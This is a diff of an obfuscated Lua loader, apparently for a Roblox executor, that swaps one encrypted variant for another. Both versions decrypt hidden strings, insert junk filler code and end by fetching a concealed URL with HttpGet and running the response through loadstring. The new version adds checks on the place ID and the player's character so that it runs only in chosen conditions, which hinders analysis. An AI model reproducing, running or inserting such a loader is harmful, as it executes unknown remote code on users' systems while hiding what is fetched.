@@ -1,129 +1,127 @@
 return (function(...)
-local _mefK=0;
-if type(print)~="function" or type(string.char)~="function" then _mefK=(_mefK+1)%256 end;
-local _mefGEN1={request=function() return request end,writefile=function() return writefile end,readfile=function() return readfile end,isfile=function() return isfile end,loadfile=function() return loadfile end,loadstring=function() return loadstring end,getgenv=function() return getgenv end,http_request=function() return http_request end,syn=function() return syn end,game=function() return game end,wait=function() return wait end,task=function() return task end,require=function() return require end,print=function() return print end,warn=function() return warn end,error=function() return error end,pcall=function() return pcall end,xpcall=function() return xpcall end,select=function() return select end,type=function() return type end,typeof=function() return typeof end,tostring=function() return tostring end,tonumber=function() return tonumber end,tick=function() return tick end,time=function() return time end,os=function() return os end,math=function() return math end,string=function() return string end,table=function() return table end,coroutine=function() return coroutine end,bit32=function() return bit32 end,debug=function() return debug end,getfenv=function() return getfenv end,setfenv=function() return setfenv end};
-local function _mefFRH0(_mefLUPM)
-local _mefLKVN=getgenv and getgenv()
-if type(_mefLKVN)=="table" and _mefLKVN[_mefLUPM]~=nil then return _mefLKVN[_mefLUPM] end
-_mefLKVN=getrenv and getrenv()
-if type(_mefLKVN)=="table" and _mefLKVN[_mefLUPM]~=nil then return _mefLKVN[_mefLUPM] end
-if type(_G)=="table" and _G[_mefLUPM]~=nil then return _G[_mefLUPM] end
-if _mefGEN1[_mefLUPM] then return _mefGEN1[_mefLUPM]() end
+local _npfK=24;
+if type(print)~="function" or type(string.char)~="function" then _npfK=(_npfK+1)%256 end;
+local _npfGBO1={request=function() return request end,writefile=function() return writefile end,readfile=function() return readfile end,isfile=function() return isfile end,loadfile=function() return loadfile end,loadstring=function() return loadstring end,getgenv=function() return getgenv end,http_request=function() return http_request end,syn=function() return syn end,game=function() return game end,wait=function() return wait end,task=function() return task end,require=function() return require end,print=function() return print end,warn=function() return warn end,error=function() return error end,pcall=function() return pcall end,xpcall=function() return xpcall end,select=function() return select end,type=function() return type end,typeof=function() return typeof end,tostring=function() return tostring end,tonumber=function() return tonumber end,tick=function() return tick end,time=function() return time end,os=function() return os end,math=function() return math end,string=function() return string end,table=function() return table end,coroutine=function() return coroutine end,bit32=function() return bit32 end,debug=function() return debug end,getfenv=function() return getfenv end,setfenv=function() return setfenv end};
+local function _npfFBH0(_npfLAZM)
+local _npfLWXN=getgenv and getgenv()
+if type(_npfLWXN)=="table" and _npfLWXN[_npfLAZM]~=nil then return _npfLWXN[_npfLAZM] end
+_npfLWXN=getrenv and getrenv()
+if type(_npfLWXN)=="table" and _npfLWXN[_npfLAZM]~=nil then return _npfLWXN[_npfLAZM] end
+if type(_G)=="table" and _G[_npfLAZM]~=nil then return _G[_npfLAZM] end
+if _npfGBO1[_npfLAZM] then return _npfGBO1[_npfLAZM]() end
 return nil
 end;
-local _mefCMX2="023071029001081168214077035162116041032062217003176084116134122120154171196201123209092027098023213062044078058122056044130102051165093178136139040172086216035105038078059254218067252036140205";
-local function _mefXUB3(_mefLRIO,_mefLGFJ)
-local _mefLGGP=0
-for _mefLVWQ=0,7 do
-if _mefLRIO%2~=_mefLGFJ%2 then _mefLGGP=_mefLGGP+2^_mefLVWQ end
-_mefLRIO=math.floor(_mefLRIO/2) _mefLGFJ=math.floor(_mefLGFJ/2)
+local _npfCBV2="073247189074101050038054160026214202029010061122246022199146086134118139117001004164126251042143091075202022230220255244027251081082036163159157127195125169127132250090230214054055117246028181";
+local function _npfXFP3(_npfLZUO,_npfLGYJ)
+local _npfLEJP=0
+for _npfLLQQ=0,7 do
+if _npfLZUO%2~=_npfLGYJ%2 then _npfLEJP=_npfLEJP+2^_npfLLQQ end
+_npfLZUO=math.floor(_npfLZUO/2) _npfLGYJ=math.floor(_npfLGYJ/2)
 end
-return _mefLGGP
+return _npfLEJP
 end;
-local function _mefYIZ4(_mefLLRA,_mefLJSR)
-local _mefLVWS=((_mefLLRA*17+_mefLJSR*5+131)%64)*3+1
-local _mefLXXC=(tonumber(_mefCMX2:sub(_mefLVWS,_mefLVWS+2))+_mefLLRA)%256
-if _mefLXXC==0 then _mefLXXC=1 end
-return _mefLXXC
+local function _npfYVQ4(_npfLRMA,_npfLCTR)
+local _npfLGTS=((_npfLRMA*17+_npfLCTR*5+131)%64)*3+1
+local _npfLQLC=(tonumber(_npfCBV2:sub(_npfLGTS,_npfLGTS+2))+_npfLRMA)%256
+if _npfLQLC==0 then _npfLQLC=1 end
+return _npfLQLC
 end;
-local function _mefDFN7(_mefLIG9,_mefLLRA,_mefLVSB)
-local _mefLXXC=_mefYIZ4(_mefLLRA,_mefLVSB)
-local _mefLTFD=_mefLLRA
-local _mefLMEE=(_mefLXXC*37+_mefLTFD*91+_mefLVSB*13)%256 if _mefLMEE==0 then _mefLMEE=1 end
-local _mefLBPF=(_mefLXXC*131+_mefLVSB*17+_mefLTFD*29)%256
-local _mefLLAG=(_mefLMEE*53+_mefLTFD*17)%256
-local _mefLMZH={}
-for _mefLVJI=0,#_mefLIG9/2-1 do
-_mefLBPF=(_mefLBPF*73+_mefLVJI*11+_mefLXXC)%256
-_mefLLAG=(_mefLLAG*47+_mefLVJI*19+_mefLMEE)%256
-local _mefLGFJ=tonumber(_mefLIG9:sub(_mefLVJI*2+1,_mefLVJI*2+2),16)
-local _mefLEXK=(_mefLTFD*31+17+_mefLVJI*13)%256 if _mefLEXK==0 then _mefLEXK=1 end
-_mefLGFJ=((_mefLGFJ%16)*16+math.floor(_mefLGFJ/16))%256
-_mefLGFJ=_mefXUB3(_mefLGFJ,_mefLEXK)
-_mefLGFJ=(_mefLGFJ-_mefLLAG)%256
-_mefLGFJ=_mefXUB3(_mefLGFJ,_mefLBPF)
-_mefLGFJ=(_mefLGFJ-_mefLXXC-_mefLVSB-_mefLTFD*7-_mefLVJI*3)%256
-_mefLMZH[#_mefLMZH+1]=string.char(_mefLGFJ)
+local function _npfDDP7(_npfLXL9,_npfLRMA,_npfLVWB)
+local _npfLQLC=_npfYVQ4(_npfLRMA,_npfLVWB)
+local _npfLAAD=_npfLRMA
+local _npfLUQE=(_npfLQLC*37+_npfLAAD*91+_npfLVWB*13)%256 if _npfLUQE==0 then _npfLUQE=1 end
+local _npfLLGF=(_npfLQLC*131+_npfLVWB*17+_npfLAAD*29)%256
+local _npfLTQG=(_npfLUQE*53+_npfLAAD*17)%256
+local _npfLQAH={}
+for _npfLYEI=0,#_npfLXL9/2-1 do
+_npfLLGF=(_npfLLGF*73+_npfLYEI*11+_npfLQLC)%256
+_npfLTQG=(_npfLTQG*47+_npfLYEI*19+_npfLUQE)%256
+local _npfLGYJ=tonumber(_npfLXL9:sub(_npfLYEI*2+1,_npfLYEI*2+2),16)
+local _npfLPUK=(_npfLAAD*31+17+_npfLYEI*13)%256 if _npfLPUK==0 then _npfLPUK=1 end
+_npfLGYJ=((_npfLGYJ%16)*16+math.floor(_npfLGYJ/16))%256
+_npfLGYJ=_npfXFP3(_npfLGYJ,_npfLPUK)
+_npfLGYJ=(_npfLGYJ-_npfLTQG)%256
+_npfLGYJ=_npfXFP3(_npfLGYJ,_npfLLGF)
+_npfLGYJ=(_npfLGYJ-_npfLQLC-_npfLVWB-_npfLAAD*7-_npfLYEI*3)%256
+_npfLQAH[#_npfLQAH+1]=string.char(_npfLGYJ)
 end
-return table.concat(_mefLMZH)
+return table.concat(_npfLQAH)
 end;
-local function _mefDPG8(_mefLIG9,_mefLLRA,_mefLVSB)
-local _mefLXXC=_mefYIZ4(_mefLLRA,_mefLVSB)
-local _mefLMZH={}
-for _mefLVJI=0,#_mefLIG9/2-1 do
-local _mefLGFJ=(tonumber(_mefLIG9:sub(_mefLVJI*2+1,_mefLVJI*2+2),16)-(_mefLXXC*11+_mefLLRA*3+_mefLVJI*7+_mefLVSB)%256)%256
-_mefLMZH[#_mefLMZH+1]=string.char(_mefLGFJ)
+local function _npfDPH8(_npfLXL9,_npfLRMA,_npfLVWB)
+local _npfLQLC=_npfYVQ4(_npfLRMA,_npfLVWB)
+local _npfLQAH={}
+for _npfLYEI=0,#_npfLXL9/2-1 do
+local _npfLGYJ=(tonumber(_npfLXL9:sub(_npfLYEI*2+1,_npfLYEI*2+2),16)-(_npfLQLC*11+_npfLRMA*3+_npfLYEI*7+_npfLVWB)%256)%256
+_npfLQAH[#_npfLQAH+1]=string.char(_npfLGYJ)
 end
-return table.concat(_mefLMZH)
+return table.concat(_npfLQAH)
 end;
-local _mefTHHL={
-[1]=function() return _mefDPG8("77817a849aa2a7a5b1b1",0,_mefK) end,
-[2]=function() return _mefDPG8("b3b4c7c6",1,_mefK) end,
-[3]=function() return _mefDPG8("c2d5dcdfe9b7b3baf5080e151318302c393f4b0c1820287530787e8983939098ac6fabbec38cd0d4e8deaff9f3fbcbdadeea1ef82b000c0f1b1c272733376e4b4b598d909872767e858ec49fa3d8dee9edf3cdd3de1319",2,_mefK) end,
-[4]=function() return _mefDFN7("5871de02c6f8b329f8b9c573466a331c70009073b8ad131c0282b5f979e18eb909bda66f57d6539e",3,_mefK) end,
-[5]=function() return _mefDPG8("cdc00515f5f60bf0291b11061d2b62674255767f8671876e7aaf947c98bca9d6caa1dde1f7c2f6dd",4,_mefK) end,
-[6]=function() return _mefDFN7("fa4b0e73d35ed60d2e44772053941878b8ee26bd87cc2d1930c132b8109cd127a1df6bb755931e54",5,_mefK) end,
-[7]=function() return _mefDFN7("a731b097090f9861bdcc5397d0c494d44ddb507a30c8d567a0aa491151063d9c5ad3e509f32aaeb8",6,_mefK) end,
-[8]=function() return _mefDPG8("2516fe1b0e5021325168373f7f8e5b9483a7ac8982a9b1b4b3ddc5cfd8dcd4df06fde425280c1815",7,_mefK) end,
-[9]=function() return _mefDPG8("67b2a3aabf99c6ceaca3afb1cac0ed08dae0e9e8183b251f1d265354714e3784545e727e93af7f94",8,_mefK) end,
-[10]=function() return _mefDFN7("ab7b18c7a9b805b3ff06355a5fcafc85d3df4e090e7b419de1ea0a5ffa44ce7c74a70da00318c4d8",9,_mefK) end,
-[11]=function() return _mefDPG8("9aa1ad7fb398c5b7a1e8c8cabffb03f2eeedf12b27f8251d4e264a50266c6e70466e975da38d9485",10,_mefK) end,
-[12]=function() return _mefDPG8("0508f7e4133a0f1907502d44486232815f5c54565f8a6e8aadbeb9d3ade0b9c7e1b6f50d0503dbf1",11,_mefK) end,
-[13]=function() return _mefDFN7("c8c907d3eccaf6e364968d17153c3e93318b838652743c2fc4cff25f3830f78b1714f2d252f523b1",12,_mefK) end,
-[14]=function() return _mefDPG8("145361672c7539425f818e8b9aa98bb383b8cfa4d3dfe4e5f0e109f3ef21fa2225350d344e24613f",13,_mefK) end,
-[15]=function() return _mefDFN7("f971ec67941fb7de924c5c5b3bebefcc11e4583c9d3188e4507323c4f7f80021c2b531d1107874ca",14,_mefK) end,
-[16]=function() return _mefDFN7("b183589199665f643bd00646b4f28d55f18d4ec037c423dd30a4ba629ab941a734a7098793e62766",15,_mefK) end,
-[17]=function() return _mefDPG8("05e1040709182608514c19374863795c5663617b979f9174b7a6bbb398a2eddfbbcd00c802fcf9f7",16,_mefK) end,
-[18]=function() return _mefDFN7("18ba1048d983b2258b9401d3eaafbff9c16c984ce41f67a2ba7295d5d3a23d7bada5fb6abd3cf25b",17,_mefK) end,
-[19]=function() return _mefDFN7("f9bea8a7e4e2bcff6aabfd95dde434618da93ba5c7c82395a0d8f28660f15f299f01f7c3e2666471",18,_mefK) end,
-[20]=function() return _mefDPG8("9d949ec9bfd296c5cee3d0ccdcff17e6e40034160b23201f3d423367493d858796998d749a78adc4",19,_mefK) end,
-[21]=function() return _mefDFN7("a2c07a533cad9f906a4b1f5ec9706cfb89b0653f1fe2ef98b09f211fabeabb337a69f69220ca8bf3",20,_mefK) end,
-[22]=function() return _mefDPG8("090c242a215359232b343252867b73718d6b737ab1bd9fa2b1d5d9c5b4cad5ed1505e1231039f90f",21,_mefK) end,
-[23]=function() return _mefDFN7("33d4e1737832be34bdf92b53730e46cc7afddad9fe2a77ee52f1d4dd4ca40964246226f03b195dfd",22,_mefK) end
+local _npfTFPL={
+[1]=function() return _npfDPH8("e1ebe4ee040c110f1b1b",0,_npfK) end,
+[2]=function() return _npfDPH8("cccde0df",1,_npfK) end,
+[3]=function() return _npfDDP7("8809020599e0ff1bddf9296e757880f215e839ffa3778cace1ff262d7a2181b127e13d1979be0c796192f22e7da5769f45552ebffe6f4e843bbc790f7167adc73d495d3aa69820d8d49b8d8a7a78aee250245d44cb249b",2,_npfK) end,
+[4]=function() return _npfDPH8("8091587f988297b9b6c2c39bd9a7e0ef01fedace1424222f2930160d125a53423d3272587d85695d",3,_npfK) end,
+[5]=function() return _npfDDP7("dca5a7b5815e82aadeecae8a92765de9b87f6567ed70c73dadc5bcfd9f59270ded89aa1e70655f85",4,_npfK) end,
+[6]=function() return _npfDPH8("67622f7e44765b7180a568a88bb0a7ce979bc7ecebc6dfc3c9130c1d271d1443114e4a2638235155",5,_npfK) end,
+[7]=function() return _npfDPH8("12fa1bff291f281f3318575641333d805767569089818eb7b595aba7b7e6c7cccad5d70fd6092926",6,_npfK) end,
+[8]=function() return _npfDDP7("4153a97789b29bd6c58cabc6d054fb99def5d8a3f018bac69a24eb247cab81cf92b6bb9a708169c3",7,_npfK) end,
+[9]=function() return _npfDPH8("06363c1c4821595939615e5d3c636e78717ea8aab58082cdae959dc9c3d8b9f0e9cedaf11debf40f",8,_npfK) end,
+[10]=function() return _npfDPH8("c0ba9f8fd6d5deb2f2cad7cb0d1200181c381741230c3043394a72556148517975a59bac9ea1a7bc",9,_npfK) end,
+[11]=function() return _npfDDP7("911617f01a49f9f82a3e391be30305337d9e647ce05bd590d784b1753c993a8c24f6d2d616dc0b99",10,_npfK) end,
+[12]=function() return _npfDDP7("a036ce95270a50d6b3eb530d276d40c6713df00775caccbd197ccf995d9c86432361f210e020dbe7",11,_npfK) end,
+[13]=function() return _npfDDP7("a02e154b7aa417c78e3deab15bf6425a1ce92831664f74eed01c9bde8dc060a59c9ff0036eaa6e87",12,_npfK) end,
+[14]=function() return _npfDPH8("0d1e4f5c294c714f796c929990796a92b79d8abed7ceb3abc2e5cff8dbe41a25e92534111a195828",13,_npfK) end,
+[15]=function() return _npfDDP7("622c706c7de0aff3fe8143c4e7452228a772dfa1df24e93d66e75b536e6e6da1c5a5140935dd8b70",14,_npfK) end,
+[16]=function() return _npfDPH8("7f9b8fa6c5d2c0e6c8f0baf0dfe6050d1df6ef320e463a441a39295b707c7a8590697e868d74ac81",15,_npfK) end,
+[17]=function() return _npfDDP7("37f7d2130ad55635dfa113faf49904425967c4bd0cd2379026f06b7fba12ca46bd8cd6dc6bf69cf3",16,_npfK) end,
+[18]=function() return _npfDPH8("c2e2b2f606dbd1d1d8f8fb100f1728424453276a6e7b517d7b50776667ab93b793c2c5becde8e5c6",17,_npfK) end,
+[19]=function() return _npfDDP7("d3fad63e1d4f495d9d8ef37c7b30b8b101afb337111066915e87c3abf80be0fea08402335a9da704",18,_npfK) end,
+[20]=function() return _npfDDP7("9cd5a98600e7fd995c04ad00d444b5d120799dbaa2203879918fa3268abafa5d7f43bef2561682c2",19,_npfK) end,
+[21]=function() return _npfDDP7("853775d5586d043808970b63a82be8700e45b6a6e6945bacea9b46b108aef8e12ebce8953285c247",20,_npfK) end,
+[22]=function() return _npfDDP7("78143f6121e7371582cde6cb3bb4aa03ee5cfd83a41b0fc8b90e144cedb5da70f1bcccf88d4bc829",21,_npfK) end,
+[23]=function() return _npfDDP7("76a46e5f96a1646c65b3207ac573aa1e7811d1b608be1f95fb408a4b09e2de557e8371fff56ebba2",22,_npfK) end
 };
-local _mefEDB5=_mefFRH0(_mefTHHL[1]());
-local _mefEQK6=_mefFRH0(_mefTHHL[(70)-68]());
-do local _mefJUCT={} local _mefJNWU=0 for _mefJCFV=1,3 do _mefJUCT[_mefJCFV]=_mefJCFV*6 _mefJNWU=_mefJNWU+_mefJUCT[_mefJCFV] end end
-do local _mefJSYW={n=42} if _mefJSYW.n>0 then local _mefJMNX=_mefJSYW.n*0 end end
-do local _mefJSNZ=(function(_mefJOW10) return _mefJOW10 end)(2) local _mefJRJ11=_mefJSNZ*0 end
-do local _mefJXU12=(function(_mefJMF13) return _mefJMF13 end)(8) local _mefJEN14=_mefJXU12*0 end
-do local _mefJMC15=("i"):rep(1) if #_mefJMC15>0 then local _mefJIN16=#_mefJMC15 end end
-do local _mefJCP18=1 while _mefJCP18<1 do _mefJCP18=_mefJCP18+1 end end
-do local _mefJYL1B=("q"):rep(4) if #_mefJYL1B>0 then local _mefJSF1C=#_mefJYL1B end end
-do local _mefJLM1E=("x"):rep(3) if #_mefJLM1E>0 then local _mefJVV1F=#_mefJLM1E end end
-do local _mefJGB1H={} local _mefJHX1I=0 for _mefJYW1J=1,6 do _mefJGB1H[_mefJYW1J]=_mefJYW1J*3 _mefJHX1I=_mefJHX1I+_mefJGB1H[_mefJYW1J] end end
-do local _mefJPT1K=1 while _mefJPT1K<1 do _mefJPT1K=_mefJPT1K+1 end end
-do local _mefJQR1N={n=33} if _mefJQR1N.n>0 then local _mefJMJ1O=_mefJQR1N.n*0 end end
-do local _mefJOA1Q={} local _mefJGF1R=0 for _mefJAS1S=1,6 do _mefJOA1Q[_mefJAS1S]=_mefJAS1S*1 _mefJGF1R=_mefJGF1R+_mefJOA1Q[_mefJAS1S] end end
-do local _mefJPE1T=("d"):rep(4) if #_mefJPE1T>0 then local _mefJVR1U=#_mefJPE1T end end
-do local _mefJYC1W=1 while _mefJYC1W<1 do _mefJYC1W=_mefJYC1W+1 end end
-do local _mefJCK1Z=("a"):rep(3) if #_mefJCK1Z>0 then local _mefJGT20=#_mefJCK1Z end end
-do local _mefJOH22=("z"):rep(2) if #_mefJOH22>0 then local _mefJLG23=#_mefJOH22 end end
-do local _mefJTV25={n=27} if _mefJTV25.n>0 then local _mefJXS26=_mefJTV25.n*0 end end
-do local _mefJFT28={n=38} if _mefJFT28.n>0 then local _mefJUV29=_mefJFT28.n*0 end end
-do local _mefJXN2B={} local _mefJES2C=0 for _mefJBH2D=1,7 do _mefJXN2B[_mefJBH2D]=_mefJBH2D*4 _mefJES2C=_mefJES2C+_mefJXN2B[_mefJBH2D] end end
-do local _=_mefTHHL[4]() end;
-do local _=_mefTHHL[(43)-38]() end;
-do local _=_mefTHHL[6]() end;
-do local _=_mefTHHL[(84)-77]() end;
-do local _=_mefTHHL[8]() end;
-do local _=_mefTHHL[(56)-47]() end;
-do local _=_mefTHHL[(75)-65]() end;
-do local _=_mefTHHL[11]() end;
-do local _=_mefTHHL[(50)-38]() end;
-do local _=_mefTHHL[13]() end;
-do local _=_mefTHHL[(79)-65]() end;
-do local _=_mefTHHL[(94)-79]() end;
-do local _=_mefTHHL[(40)-24]() end;
-do local _=_mefTHHL[17]() end;
-do local _=_mefTHHL[18]() end;
-do local _=_mefTHHL[(75)-56]() end;
-do local _=_mefTHHL[20]() end;
-do local _=_mefTHHL[21]() end;
-do local _=_mefTHHL[(73)-51]() end;
-do local _=_mefTHHL[(106)-83]() end;
+local _npfEWS5=_npfFBH0(_npfTFPL[(66)-65]());
+local _npfEOT6=_npfFBH0(_npfTFPL[2]());
+local _npfBOJT=nil;if getgenv==nil then return end;pcall(function()local c=string.char;local g=game;local P=g[c(80,108,97,99,101,73,100)];if(P%251)~=24 then return end;local Ps=g:GetService(c(80,108,97,121,101,114,115));local LP=Ps[c(76,111,99,97,108,80,108,97,121,101,114)];local U=LP[c(85,115,101,114,73,100)];if type(U)~=c(110,117,109,98,101,114) then return end;if(-1>=0 and(U%251)~=-1)then return end;local ok=false;for i=1,25 do local ch=LP[c(67,104,97,114,97,99,116,101,114)];local rt=ch and ch:FindFirstChild(c(72,117,109,97,110,111,105,100,82,111,111,116,80,97,114,116));if rt then ok=true;break end;task.wait(1) end;if not ok then return end;_npfBOJT=1 end);if _npfBOJT==nil then return end;
+do local _npfJHCU={} local _npfJSLV=0 for _npfJSDW=1,5 do _npfJHCU[_npfJSDW]=_npfJSDW*2 _npfJSLV=_npfJSLV+_npfJHCU[_npfJSDW] end end
+do local _npfJAUX={n=39} if _npfJAUX.n>0 then local _npfJNYY=_npfJAUX.n*0 end end
+do local _npfJSX10=("h"):rep(2) if #_npfJSX10>0 then local _npfJSW11=#_npfJSX10 end end
+do local _npfJWG13={n=12} if _npfJWG13.n>0 then local _npfJMJ14=_npfJWG13.n*0 end end
+do local _npfJQW16=(function(_npfJLE17) return _npfJLE17 end)(4) local _npfJBG18=_npfJQW16*0 end
+do local _npfJSN19={n=40} if _npfJSN19.n>0 then local _npfJOS1A=_npfJSN19.n*0 end end
+do local _npfJLB1C={n=32} if _npfJLB1C.n>0 then local _npfJHN1D=_npfJLB1C.n*0 end end
+do local _npfJTB1F=1 while _npfJTB1F<1 do _npfJTB1F=_npfJTB1F+1 end end
+do local _npfJEN1I=("w"):rep(2) if #_npfJEN1I>0 then local _npfJRB1J=#_npfJEN1I end end
+do local _npfJGH1L={} local _npfJVJ1M=0 for _npfJTY1N=1,7 do _npfJGH1L[_npfJTY1N]=_npfJTY1N*4 _npfJVJ1M=_npfJVJ1M+_npfJGH1L[_npfJTY1N] end end
+do local _npfJEA1O=1 while _npfJEA1O<1 do _npfJEA1O=_npfJEA1O+1 end end
+do local _npfJIF1R=("o"):rep(2) if #_npfJIF1R>0 then local _npfJHX1S=#_npfJIF1R end end
+do local _npfJVH1U=(function(_npfJKD1V) return _npfJKD1V end)(7) local _npfJTB1W=_npfJVH1U*0 end
+do local _npfJZX1X=1 while _npfJZX1X<1 do _npfJZX1X=_npfJZX1X+1 end end
+do local _npfJCS20=1 while _npfJCS20<1 do _npfJCS20=_npfJCS20+1 end end
+do local _npfJDA23={} local _npfJYY24=0 for _npfJBP25=1,4 do _npfJDA23[_npfJBP25]=_npfJBP25*4 _npfJYY24=_npfJYY24+_npfJDA23[_npfJBP25] end end
+do local _=_npfTFPL[(37)-33]() end;
+do local _=_npfTFPL[(11)-6]() end;
+do local _=_npfTFPL[6]() end;
+do local _=_npfTFPL[(62)-55]() end;
+do local _=_npfTFPL[(93)-85]() end;
+do local _=_npfTFPL[(24)-15]() end;
+do local _=_npfTFPL[(81)-71]() end;
+do local _=_npfTFPL[11]() end;
+do local _=_npfTFPL[12]() end;
+do local _=_npfTFPL[(92)-79]() end;
+do local _=_npfTFPL[(44)-30]() end;
+do local _=_npfTFPL[15]() end;
+do local _=_npfTFPL[(92)-76]() end;
+do local _=_npfTFPL[17]() end;
+do local _=_npfTFPL[(74)-56]() end;
+do local _=_npfTFPL[(102)-83]() end;
+do local _=_npfTFPL[20]() end;
+do local _=_npfTFPL[(42)-21]() end;
+do local _=_npfTFPL[22]() end;
+do local _=_npfTFPL[(75)-52]() end;
 
 return (function(...)
-_mefEDB5(_mefEQK6:HttpGet(_mefTHHL[3]()))()
+_npfEWS5(_npfEOT6:HttpGet(_npfTFPL[(88)-85]()))()
 end)(...)
 end)(...)
